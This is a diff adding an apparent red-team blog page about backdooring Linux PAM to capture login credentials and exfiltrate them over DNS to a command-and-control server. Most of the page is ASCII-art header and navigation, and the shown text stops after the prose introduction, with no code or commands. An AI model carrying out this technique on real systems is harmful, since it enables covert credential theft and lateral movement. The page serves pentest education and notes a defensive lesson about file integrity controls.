@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+	<!-- Basic information about this page -->
+<meta charset="UTF-8">
+<link rel="icon" type="image/x-icon" href="/assets/img/fav.ico">
+<title>
+	
+		Exfiltrating credentials via PAM backdoors & DNS requests ::
+	
+	DoomsDay Vault
+</title>
+
+<!-- Meta tag looking for mobile devices -->
+<meta name="viewport" content="width=device-width,initial-scale=0.5,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#232323">
+
+<!-- Good information about this page -->
+<meta name="description" content="Description of how to backdoor PAM and exfiltrate credentials via DNS requests. Capture credentials FTW!">
+<meta name="keywords" content="RedTeam, Hacking, Infosec, pentest, security, red team, redteam, backdoor, PAM, post-explotation, PAM module, DNS">
+<meta name="author" content="DoomsDay Vault">
+
+<!-- Feed links -->
+<link rel="alternate" type="application/rss+xml" title="DoomsDay Vault's RSS Feed" href="/rss.xml">
+<link rel="alternate" type="application/atom+xml" title="DoomsDay Vault's Atom Feed" href="/atom.xml">
+
+<!-- Style and scripts files -->
+<link rel="stylesheet" type="text/css" href="/assets/css/style.css">
+<link href="/assets/css/syntax.css" type="text/css" rel="stylesheet" >
+
+<!-- Extra information about this page -->
+<link rel="license" type="text/plain" src="/assets/LICENSE">
+
+
+	<body>
+        <header>
+
+
+
+    <center>
+
+
+<div style="font-family: monospace;white-space: pre;"><div><span style="color:#ff0000;">█</span><span style="color:#ff0300;">█</span><span style="color:#ff0600;">▄</span><span style="color:#ff0800;"> </span><span style="color:#ff0b00;"> </span><span style="color:#ff0e00;"> </span><span style="color:#ff1100;">█</span><span style="color:#ff1300;">█</span><span style="color:#ff1600;">█</span><span style="color:#ff1900;">█</span><span style="color:#ff1c00;">▄</span><span style="color:#ff1e00;"> </span><span style="color:#ff2100;">█</span><span style="color:#ff2400;">█</span><span style="color:#ff2700;">█</span><span style="color:#ff2900;">█</span><span style="color:#ff2c00;">▄</span><span style="color:#ff2f00;"> </span><span style="color:#ff3200;">█</span><span style="color:#ff3400;">▀</span><span style="color:#ff3700;">▄</span><span style="color:#ff3a00;">▀</span><span style="color:#ff3d00;">█</span><span style="color:#ff3f00;"> </span><span style="color:#ff4200;"> </span><span style="color:#ff4500;"> </span><span style="color:#ff4800;"> </span><span style="color:#ff4b00;">▄</span><span style="color:#ff4d00;">▄</span><span style="color:#ff5000;">▄</span><span style="color:#ff5300;">▄</span><span style="color:#ff5600;">▄</span><span style="color:#ff5800;"> </span><span style="color:#ff5b00;"> </span><span style="color:#ff5e00;"> </span><span style="color:#ff6100;">█</span><span style="color:#ff6300;">█</span><span style="color:#ff6600;">▄</span><span style="color:#ff6900;"> </span><span style="color:#ff6c00;"> </span><span style="color:#ff6e00;"> </span><span style="color:#ff7100;">█</span><span style="color:#ff7400;">█</span><span style="color:#ff7700;"> </span><span style="color:#ff7900;"> </span><span style="color:#ff7c00;"> </span><span style="color:#ff7f00;">▀</span><span style="color:#ff8200;">▄</span><span style="color:#ff8500;"> </span><span style="color:#ff8800;"> </span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;"> </span><span style="color:#ff9000;">▄</span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;"> </span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;">▄</span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;"> </span><span style="color:#ffb500;"> </span><span style="color:#ffb800;">█</span><span style="color:#ffbb00;">█</span><span style="color:#ffbe00;"> </span><span style="color:#ffc000;"> </span><span style="color:#ffc300;"> </span><span style="color:#ffc600;"> </span><span style="color:#ffc900;"> </span><span style="color:#ffcc00;">▄</span><span style="color:#ffcf00;"> </span><span style="color:#ffd100;"> </span><span style="color:#ffd400;"> </span><span style="color:#ffd700;">█</span><span style="color:#ffda00;"> </span><span style="color:#ffdd00;"> </span><span style="color:#ffe000;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffe500;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffeb00;"> </span><span style="color:#ffee00;"> </span><span style="color:#fff100;">▄</span><span style="color:#fff400;">▄</span><span style="color:#fff600;">▄</span><span style="color:#fff900;">▄</span><span style="color:#fffc00;">▀</span><span style="color:#ffff00;"> </span></div><div><span style="color:#ff0300;">█</span><span style="color:#ff0600;"> </span><span style="color:#ff0800;"> </span><span style="color:#ff0b00;">█</span><span style="color:#ff0e00;"> </span><span style="color:#ff1100;"> </span><span style="color:#ff1300;">█</span><span style="color:#ff1600;"> </span><span style="color:#ff1900;"> </span><span style="color:#ff1c00;"> </span><span style="color:#ff1e00;">█</span><span style="color:#ff2100;"> </span><span style="color:#ff2400;">█</span><span style="color:#ff2700;"> </span><span style="color:#ff2900;"> </span><span style="color:#ff2c00;"> </span><span style="color:#ff2f00;">█</span><span style="color:#ff3200;"> </span><span style="color:#ff3400;">█</span><span style="color:#ff3700;"> </span><span style="color:#ff3a00;">█</span><span style="color:#ff3d00;"> </span><span style="color:#ff3f00;">█</span><span style="color:#ff4200;"> </span><span style="color:#ff4500;"> </span><span style="color:#ff4800;"> </span><span style="color:#ff4b00;">█</span><span style="color:#ff4d00;"> </span><span style="color:#ff5000;"> </span><span style="color:#ff5300;"> </span><span style="color:#ff5600;"> </span><span style="color:#ff5800;"> </span><span style="color:#ff5b00;">▀</span><span style="color:#ff5e00;">▄</span><span style="color:#ff6100;"> </span><span style="color:#ff6300;">█</span><span style="color:#ff6600;"> </span><span style="color:#ff6900;"> </span><span style="color:#ff6c00;">█</span><span style="color:#ff6e00;"> </span><span style="color:#ff7100;"> </span><span style="color:#ff7400;">█</span><span style="color:#ff7700;"> </span><span style="color:#ff7900;">█</span><span style="color:#ff7c00;"> </span><span style="color:#ff7f00;"> </span><span style="color:#ff8200;"> </span><span style="color:#ff8500;"> </span><span style="color:#ff8800;">█</span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;"> </span><span style="color:#ff9000;">█</span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;"> </span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;"> </span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;">█</span><span style="color:#ffb500;"> </span><span style="color:#ffb800;"> </span><span style="color:#ffbb00;">█</span><span style="color:#ffbe00;"> </span><span style="color:#ffc000;">█</span><span style="color:#ffc300;"> </span><span style="color:#ffc600;"> </span><span style="color:#ffc900;"> </span><span style="color:#ffcc00;"> </span><span style="color:#ffcf00;"> </span><span style="color:#ffd100;">█</span><span style="color:#ffd400;"> </span><span style="color:#ffd700;"> </span><span style="color:#ffda00;">█</span><span style="color:#ffdd00;"> </span><span style="color:#ffe000;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffe500;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffeb00;">▀</span><span style="color:#ffee00;">▀</span><span style="color:#fff100;">▀</span><span style="color:#fff400;"> </span><span style="color:#fff600;">█</span><span style="color:#fff900;"> </span><span style="color:#fffc00;"> </span><span style="color:#ffff00;"> </span><span style="color:#fff900;"> </span></div><div><span style="color:#ff0600;">█</span><span style="color:#ff0800;"> </span><span style="color:#ff0b00;"> </span><span style="color:#ff0e00;"> </span><span style="color:#ff1100;">█</span><span style="color:#ff1300;"> </span><span style="color:#ff1600;">█</span><span style="color:#ff1900;"> </span><span style="color:#ff1c00;"> </span><span style="color:#ff1e00;"> </span><span style="color:#ff2100;">█</span><span style="color:#ff2400;"> </span><span style="color:#ff2700;">█</span><span style="color:#ff2900;"> </span><span style="color:#ff2c00;"> </span><span style="color:#ff2f00;"> </span><span style="color:#ff3200;">█</span><span style="color:#ff3400;"> </span><span style="color:#ff3700;">█</span><span style="color:#ff3a00;"> </span><span style="color:#ff3d00;">▄</span><span style="color:#ff3f00;"> </span><span style="color:#ff4200;">█</span><span style="color:#ff4500;"> </span><span style="color:#ff4800;">▄</span><span style="color:#ff4b00;"> </span><span style="color:#ff4d00;"> </span><span style="color:#ff5000;">▀</span><span style="color:#ff5300;">▀</span><span style="color:#ff5600;">▀</span><span style="color:#ff5800;">▀</span><span style="color:#ff5b00;">▄</span><span style="color:#ff5e00;"> </span><span style="color:#ff6100;"> </span><span style="color:#ff6300;"> </span><span style="color:#ff6600;">█</span><span style="color:#ff6900;"> </span><span style="color:#ff6c00;"> </span><span style="color:#ff6e00;"> </span><span style="color:#ff7100;">█</span><span style="color:#ff7400;"> </span><span style="color:#ff7700;">█</span><span style="color:#ff7900;">▄</span><span style="color:#ff7c00;">▄</span><span style="color:#ff7f00;">█</span><span style="color:#ff8200;"> </span><span style="color:#ff8500;"> </span><span style="color:#ff8800;"> </span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;">▀</span><span style="color:#ff9000;">█</span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;">█</span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;"> </span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;"> </span><span style="color:#ffb500;"> </span><span style="color:#ffb800;">█</span><span style="color:#ffbb00;"> </span><span style="color:#ffbe00;">█</span><span style="color:#ffc000;">▄</span><span style="color:#ffc300;">▄</span><span style="color:#ffc600;">█</span><span style="color:#ffc900;"> </span><span style="color:#ffcc00;">█</span><span style="color:#ffcf00;"> </span><span style="color:#ffd100;"> </span><span style="color:#ffd400;"> </span><span style="color:#ffd700;">█</span><span style="color:#ffda00;"> </span><span style="color:#ffdd00;">█</span><span style="color:#ffe000;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffe500;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffeb00;"> </span><span style="color:#ffee00;"> </span><span style="color:#fff100;"> </span><span style="color:#fff400;"> </span><span style="color:#fff600;"> </span><span style="color:#fff900;">█</span><span style="color:#fffc00;"> </span><span style="color:#ffff00;"> </span><span style="color:#fff900;"> </span><span style="color:#fff400;"> </span></div><div><span style="color:#ff0800;">█</span><span style="color:#ff0b00;"> </span><span style="color:#ff0e00;"> </span><span style="color:#ff1100;">█</span><span style="color:#ff1300;"> </span><span style="color:#ff1600;"> </span><span style="color:#ff1900;">▀</span><span style="color:#ff1c00;">█</span><span style="color:#ff1e00;">█</span><span style="color:#ff2100;">█</span><span style="color:#ff2400;">█</span><span style="color:#ff2700;"> </span><span style="color:#ff2900;">▀</span><span style="color:#ff2c00;">█</span><span style="color:#ff2f00;">█</span><span style="color:#ff3200;">█</span><span style="color:#ff3400;">█</span><span style="color:#ff3700;"> </span><span style="color:#ff3a00;">█</span><span style="color:#ff3d00;"> </span><span style="color:#ff3f00;"> </span><span style="color:#ff4200;"> </span><span style="color:#ff4500;">█</span><span style="color:#ff4800;"> </span><span style="color:#ff4b00;"> </span><span style="color:#ff4d00;">▀</span><span style="color:#ff5000;">▄</span><span style="color:#ff5300;">▄</span><span style="color:#ff5600;">▄</span><span style="color:#ff5800;">▄</span><span style="color:#ff5b00;">▀</span><span style="color:#ff5e00;"> </span><span style="color:#ff6100;"> </span><span style="color:#ff6300;"> </span><span style="color:#ff6600;"> </span><span style="color:#ff6900;">█</span><span style="color:#ff6c00;"> </span><span style="color:#ff6e00;"> </span><span style="color:#ff7100;">█</span><span style="color:#ff7400;"> </span><span style="color:#ff7700;"> </span><span style="color:#ff7900;">█</span><span style="color:#ff7c00;"> </span><span style="color:#ff7f00;"> </span><span style="color:#ff8200;">█</span><span style="color:#ff8500;"> </span><span style="color:#ff8800;"> </span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;"> </span><span style="color:#ff9000;">█</span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;"> </span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;">█</span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;"> </span><span style="color:#ffb500;"> </span><span style="color:#ffb800;"> </span><span style="color:#ffbb00;">█</span><span style="color:#ffbe00;"> </span><span style="color:#ffc000;">█</span><span style="color:#ffc300;"> </span><span style="color:#ffc600;"> </span><span style="color:#ffc900;">█</span><span style="color:#ffcc00;"> </span><span style="color:#ffcf00;">█</span><span style="color:#ffd100;"> </span><span style="color:#ffd400;"> </span><span style="color:#ffd700;"> </span><span style="color:#ffda00;">█</span><span style="color:#ffdd00;"> </span><span style="color:#ffe000;">█</span><span style="color:#ffe300;">█</span><span style="color:#ffe500;">█</span><span style="color:#ffe800;">▄</span><span style="color:#ffeb00;"> </span><span style="color:#ffee00;"> </span><span style="color:#fff100;"> </span><span style="color:#fff400;"> </span><span style="color:#fff600;"> </span><span style="color:#fff900;">█</span><span style="color:#fffc00;"> </span><span style="color:#ffff00;"> </span><span style="color:#fff900;"> </span><span style="color:#fff400;"> </span><span style="color:#ffee00;"> </span></div><div><span style="color:#ff0b00;">█</span><span style="color:#ff0e00;">█</span><span style="color:#ff1100;">█</span><span style="color:#ff1300;">▀</span><span style="color:#ff1600;"> </span><span style="color:#ff1900;"> </span><span style="color:#ff1c00;"> </span><span style="color:#ff1e00;"> </span><span style="color:#ff2100;"> </span><span style="color:#ff2400;"> </span><span style="color:#ff2700;"> </span><span style="color:#ff2900;"> </span><span style="color:#ff2c00;"> </span><span style="color:#ff2f00;"> </span><span style="color:#ff3200;"> </span><span style="color:#ff3400;"> </span><span style="color:#ff3700;"> </span><span style="color:#ff3a00;"> </span><span style="color:#ff3d00;"> </span><span style="color:#ff3f00;"> </span><span style="color:#ff4200;"> </span><span style="color:#ff4500;">█</span><span style="color:#ff4800;"> </span><span style="color:#ff4b00;"> </span><span style="color:#ff4d00;"> </span><span style="color:#ff5000;"> </span><span style="color:#ff5300;"> </span><span style="color:#ff5600;"> </span><span style="color:#ff5800;"> </span><span style="color:#ff5b00;"> </span><span style="color:#ff5e00;"> </span><span style="color:#ff6100;"> </span><span style="color:#ff6300;"> </span><span style="color:#ff6600;"> </span><span style="color:#ff6900;"> </span><span style="color:#ff6c00;">█</span><span style="color:#ff6e00;">█</span><span style="color:#ff7100;">█</span><span style="color:#ff7400;">▀</span><span style="color:#ff7700;"> </span><span style="color:#ff7900;"> </span><span style="color:#ff7c00;"> </span><span style="color:#ff7f00;"> </span><span style="color:#ff8200;"> </span><span style="color:#ff8500;">█</span><span style="color:#ff8800;"> </span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;">▄</span><span style="color:#ff9000;">▀</span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;"> </span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;"> </span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;">█</span><span style="color:#ffb500;"> </span><span style="color:#ffb800;"> </span><span style="color:#ffbb00;">█</span><span style="color:#ffbe00;"> </span><span style="color:#ffc000;"> </span><span style="color:#ffc300;"> </span><span style="color:#ffc600;"> </span><span style="color:#ffc900;"> </span><span style="color:#ffcc00;">█</span><span style="color:#ffcf00;"> </span><span style="color:#ffd100;">█</span><span style="color:#ffd400;">▄</span><span style="color:#ffd700;"> </span><span style="color:#ffda00;">▄</span><span style="color:#ffdd00;">█</span><span style="color:#ffe000;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffe500;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffeb00;"> </span><span style="color:#ffee00;">▀</span><span style="color:#fff100;"> </span><span style="color:#fff400;"> </span><span style="color:#fff600;"> </span><span style="color:#fff900;">▀</span><span style="color:#fffc00;"> </span><span style="color:#ffff00;"> </span><span style="color:#fff900;"> </span><span style="color:#fff400;"> </span><span style="color:#ffee00;"> </span><span style="color:#ffe800;"> </span></div><div><span style="color:#ff0e00;"> </span><span style="color:#ff1100;"> </span><span style="color:#ff1300;"> </span><span style="color:#ff1600;"> </span><span style="color:#ff1900;"> </span><span style="color:#ff1c00;"> </span><span style="color:#ff1e00;"> </span><span style="color:#ff2100;"> </span><span style="color:#ff2400;"> </span><span style="color:#ff2700;"> </span><span style="color:#ff2900;"> </span><span style="color:#ff2c00;"> </span><span style="color:#ff2f00;"> </span><span style="color:#ff3200;"> </span><span style="color:#ff3400;"> </span><span style="color:#ff3700;"> </span><span style="color:#ff3a00;"> </span><span style="color:#ff3d00;"> </span><span style="color:#ff3f00;"> </span><span style="color:#ff4200;"> </span><span style="color:#ff4500;">▀</span><span style="color:#ff4800;"> </span><span style="color:#ff4b00;"> </span><span style="color:#ff4d00;"> </span><span style="color:#ff5000;"> </span><span style="color:#ff5300;"> </span><span style="color:#ff5600;"> </span><span style="color:#ff5800;"> </span><span style="color:#ff5b00;"> </span><span style="color:#ff5e00;"> </span><span style="color:#ff6100;"> </span><span style="color:#ff6300;"> </span><span style="color:#ff6600;"> </span><span style="color:#ff6900;"> </span><span style="color:#ff6c00;"> </span><span style="color:#ff6e00;"> </span><span style="color:#ff7100;"> </span><span style="color:#ff7400;"> </span><span style="color:#ff7700;"> </span><span style="color:#ff7900;"> </span><span style="color:#ff7c00;"> </span><span style="color:#ff7f00;"> </span><span style="color:#ff8200;"> </span><span style="color:#ff8500;">█</span><span style="color:#ff8800;"> </span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;"> </span><span style="color:#ff9000;"> </span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;"> </span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;"> </span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;"> </span><span style="color:#ffb500;"> </span><span style="color:#ffb800;">█</span><span style="color:#ffbb00;">▐</span><span style="color:#ffbe00;"> </span><span style="color:#ffc000;"> </span><span style="color:#ffc300;"> </span><span style="color:#ffc600;"> </span><span style="color:#ffc900;"> </span><span style="color:#ffcc00;">█</span><span style="color:#ffcf00;"> </span><span style="color:#ffd100;"> </span><span style="color:#ffd400;"> </span><span style="color:#ffd700;">▀</span><span style="color:#ffda00;">▀</span><span style="color:#ffdd00;">▀</span><span style="color:#ffe000;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffe500;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffeb00;"> </span><span style="color:#ffee00;"> </span><span style="color:#fff100;"> </span><span style="color:#fff400;"> </span><span style="color:#fff600;"> </span><span style="color:#fff900;"> </span><span style="color:#fffc00;"> </span><span style="color:#ffff00;"> </span><span style="color:#fff900;"> </span><span style="color:#fff400;"> </span><span style="color:#ffee00;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffe300;"> </span></div><div><span style="color:#ff1100;"> </span><span style="color:#ff1300;"> </span><span style="color:#ff1600;"> </span><span style="color:#ff1900;"> </span><span style="color:#ff1c00;"> </span><span style="color:#ff1e00;"> </span><span style="color:#ff2100;"> </span><span style="color:#ff2400;"> </span><span style="color:#ff2700;"> </span><span style="color:#ff2900;"> </span><span style="color:#ff2c00;"> </span><span style="color:#ff2f00;"> </span><span style="color:#ff3200;"> </span><span style="color:#ff3400;"> </span><span style="color:#ff3700;"> </span><span style="color:#ff3a00;"> </span><span style="color:#ff3d00;"> </span><span style="color:#ff3f00;"> </span><span style="color:#ff4200;"> </span><span style="color:#ff4500;"> </span><span style="color:#ff4800;"> </span><span style="color:#ff4b00;"> </span><span style="color:#ff4d00;"> </span><span style="color:#ff5000;"> </span><span style="color:#ff5300;"> </span><span style="color:#ff5600;"> </span><span style="color:#ff5800;"> </span><span style="color:#ff5b00;"> </span><span style="color:#ff5e00;"> </span><span style="color:#ff6100;"> </span><span style="color:#ff6300;"> </span><span style="color:#ff6600;"> </span><span style="color:#ff6900;"> </span><span style="color:#ff6c00;"> </span><span style="color:#ff6e00;"> </span><span style="color:#ff7100;"> </span><span style="color:#ff7400;"> </span><span style="color:#ff7700;"> </span><span style="color:#ff7900;"> </span><span style="color:#ff7c00;"> </span><span style="color:#ff7f00;"> </span><span style="color:#ff8200;"> </span><span style="color:#ff8500;">▀</span><span style="color:#ff8800;"> </span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;"> </span><span style="color:#ff9000;"> </span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;"> </span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;"> </span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;"> </span><span style="color:#ffb500;"> </span><span style="color:#ffb800;"> </span><span style="color:#ffbb00;">▐</span><span style="color:#ffbe00;"> </span><span style="color:#ffc000;"> </span><span style="color:#ffc300;"> </span><span style="color:#ffc600;"> </span><span style="color:#ffc900;"> </span><span style="color:#ffcc00;">▀</span><span style="color:#ffcf00;"> </span><span style="color:#ffd100;"> </span><span style="color:#ffd400;"> </span><span style="color:#ffd700;"> </span><span style="color:#ffda00;"> </span><span style="color:#ffdd00;"> </span><span style="color:#ffe000;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffe500;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffeb00;"> </span><span style="color:#ffee00;"> </span><span style="color:#fff100;"> </span><span style="color:#fff400;"> </span><span style="color:#fff600;"> </span><span style="color:#fff900;"> </span><span style="color:#fffc00;"> </span><span style="color:#ffff00;"> </span><span style="color:#fff900;"> </span><span style="color:#fff400;"> </span><span style="color:#ffee00;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffdd00;"> </span></div><div><span style="color:#ff1300;"> </span><span style="color:#ff1600;"> </span><span style="color:#ff1900;"> </span><span style="color:#ff1c00;"> </span><span style="color:#ff1e00;"> </span><span style="color:#ff2100;"> </span><span style="color:#ff2400;"> </span><span style="color:#ff2700;"> </span><span style="color:#ff2900;"> </span><span style="color:#ff2c00;"> </span><span style="color:#ff2f00;"> </span><span style="color:#ff3200;"> </span><span style="color:#ff3400;"> </span><span style="color:#ff3700;"> </span><span style="color:#ff3a00;"> </span><span style="color:#ff3d00;"> </span><span style="color:#ff3f00;"> </span><span style="color:#ff4200;"> </span><span style="color:#ff4500;"> </span><span style="color:#ff4800;"> </span><span style="color:#ff4b00;"> </span><span style="color:#ff4d00;"> </span><span style="color:#ff5000;"> </span><span style="color:#ff5300;"> </span><span style="color:#ff5600;"> </span><span style="color:#ff5800;"> </span><span style="color:#ff5b00;"> </span><span style="color:#ff5e00;"> </span><span style="color:#ff6100;"> </span><span style="color:#ff6300;"> </span><span style="color:#ff6600;"> </span><span style="color:#ff6900;"> </span><span style="color:#ff6c00;"> </span><span style="color:#ff6e00;"> </span><span style="color:#ff7100;"> </span><span style="color:#ff7400;"> </span><span style="color:#ff7700;"> </span><span style="color:#ff7900;"> </span><span style="color:#ff7c00;"> </span><span style="color:#ff7f00;"> </span><span style="color:#ff8200;"> </span><span style="color:#ff8500;"> </span><span style="color:#ff8800;"> </span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;"> </span><span style="color:#ff9000;"> </span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;"> </span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;"> </span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;"> </span><span style="color:#ffb500;"> </span><span style="color:#ffb800;"> </span><span style="color:#ffbb00;"> </span><span style="color:#ffbe00;"> </span><span style="color:#ffc000;"> </span><span style="color:#ffc300;"> </span><span style="color:#ffc600;"> </span><span style="color:#ffc900;"> </span><span style="color:#ffcc00;"> </span><span style="color:#ffcf00;"> </span><span style="color:#ffd100;"> </span><span style="color:#ffd400;"> </span><span style="color:#ffd700;"> </span><span style="color:#ffda00;"> </span><span style="color:#ffdd00;"> </span><span style="color:#ffe000;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffe500;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffeb00;"> </span><span style="color:#ffee00;"> </span><span style="color:#fff100;"> </span><span style="color:#fff400;"> </span><span style="color:#fff600;"> </span><span style="color:#fff900;"> </span><span style="color:#fffc00;"> </span><span style="color:#ffff00;"> </span><span style="color:#fff900;"> </span><span style="color:#fff400;"> </span><span style="color:#ffee00;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffdd00;"> </span><span style="color:#ffd700;"> </span></div><div><span style="color:#ff1600;"> </span><span style="color:#ff1900;"> </span><span style="color:#ff1c00;"> </span><span style="color:#ff1e00;"> </span><span style="color:#ff2100;"> </span><span style="color:#ff2400;"> </span><span style="color:#ff2700;"> </span><span style="color:#ff2900;"> </span><span style="color:#ff2c00;"> </span><span style="color:#ff2f00;"> </span><span style="color:#ff3200;"> </span><span style="color:#ff3400;"> </span><span style="color:#ff3700;"> </span><span style="color:#ff3a00;"> </span><span style="color:#ff3d00;"> </span><span style="color:#ff3f00;"> </span><span style="color:#ff4200;"> </span><span style="color:#ff4500;"> </span><span style="color:#ff4800;"> </span><span style="color:#ff4b00;"> </span><span style="color:#ff4d00;"> </span><span style="color:#ff5000;"> </span><span style="color:#ff5300;"> </span><span style="color:#ff5600;"> </span><span style="color:#ff5800;"> </span><span style="color:#ff5b00;"> </span><span style="color:#ff5e00;"> </span><span style="color:#ff6100;"> </span><span style="color:#ff6300;"> </span><span style="color:#ff6600;"> </span><span style="color:#ff6900;"> </span><span style="color:#ff6c00;"> </span><span style="color:#ff6e00;"> </span><span style="color:#ff7100;"> </span><span style="color:#ff7400;"> </span><span style="color:#ff7700;"> </span><span style="color:#ff7900;"> </span><span style="color:#ff7c00;"> </span><span style="color:#ff7f00;"> </span><span style="color:#ff8200;"> </span><span style="color:#ff8500;"> </span><span style="color:#ff8800;"> </span><span style="color:#ff8a00;"> </span><span style="color:#ff8d00;"> </span><span style="color:#ff9000;"> </span><span style="color:#ff9300;"> </span><span style="color:#ff9600;"> </span><span style="color:#ff9900;"> </span><span style="color:#ff9b00;"> </span><span style="color:#ff9e00;"> </span><span style="color:#ffa100;"> </span><span style="color:#ffa400;"> </span><span style="color:#ffa700;"> </span><span style="color:#ffaa00;"> </span><span style="color:#ffad00;"> </span><span style="color:#ffaf00;"> </span><span style="color:#ffb200;"> </span><span style="color:#ffb500;"> </span><span style="color:#ffb800;"> </span><span style="color:#ffbb00;"> </span><span style="color:#ffbe00;"> </span><span style="color:#ffc000;"> </span><span style="color:#ffc300;"> </span><span style="color:#ffc600;"> </span><span style="color:#ffc900;"> </span><span style="color:#ffcc00;"> </span><span style="color:#ffcf00;"> </span><span style="color:#ffd100;"> </span><span style="color:#ffd400;"> </span><span style="color:#ffd700;"> </span><span style="color:#ffda00;"> </span><span style="color:#ffdd00;"> </span><span style="color:#ffe000;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffe500;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffeb00;"> </span><span style="color:#ffee00;"> </span><span style="color:#fff100;"> </span><span style="color:#fff400;"> </span><span style="color:#fff600;"> </span><span style="color:#fff900;"> </span><span style="color:#fffc00;"> </span><span style="color:#ffff00;"> </span><span style="color:#fff900;"> </span><span style="color:#fff400;"> </span><span style="color:#ffee00;"> </span><span style="color:#ffe800;"> </span><span style="color:#ffe300;"> </span><span style="color:#ffdd00;"> </span><span style="color:#ffd700;"> </span><span style="color:#ffd200;"> </span></div></div>
+
+
+<div style='font-family: Quantico;'>
+Just a blog  to preserve some thoughts about Red Teaming :)</div>
+    </center>
+</header>
+
+
+        
+<nav>
+	<ul>
+		<li><a href="/">Home</a></li>
+	<li><a href="/about.html">About</a></li>
+		<li><a href="/cves.html">CVEs</a></li>
+		<li><a href="/tools.html">Tools</a></li>
+		<li><a href="/stuff.html">Others</a></li>
+	<li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+	
+</ul>
+</nav>
+
+		<main>
+			<header> 
+    <h1>Exfiltrating credentials via PAM backdoors & DNS requests</h1> <font style="color: white;">2018-06-27 13:37:00 +0000</font>
+</header>
+<p>        
+Probably one of the most well-known post-explotation techniques used in pentests, and in Red Team operations, is to drop a backdoor in the PAM ecosystem in order to collect valid credentials. The credentials catched by our backdoor will help us to perform easily the lateral movement between machines. We can achieve this though different options.</p>
+
+<p>        
+An interesting twist is to mix up this technique with the classic DNS exfiltration, so we can send the credentials to our C&amp;C without worry about firewalls and traffic rules. We only need to send a DNS request to the DNS server used by the machine, then it will be forwarded to other DNS servers, and at some point the request will hit our Authoritative DNS Server. So we can retrieve silently credentials using this well-known covert channel.</p>
+
+<p>        
+Our roadmap is pretty simple: add a custom PAM module that logs the credential in plaintext and send it to our C&amp;C though a DNS resolution.</p>
+
+<p>        
+As side note: even if this is an old and well-known tactic, it keep being a really cool way to show the needed of file integrity controls. Root a server, wait until an administrator or operator log in via SSH and <strong>enjoy! :)</strong></p>
+
